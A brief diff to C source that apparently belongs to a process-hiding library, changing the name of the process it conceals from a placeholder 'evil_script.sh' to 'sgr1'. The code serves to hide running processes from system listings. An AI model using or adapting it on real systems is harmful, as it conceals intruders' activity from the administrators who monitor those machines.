@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.sh";
+static const char* process_to_filter = "sgr1";
 
 /*
  * Get a directory name given a DIR* handle
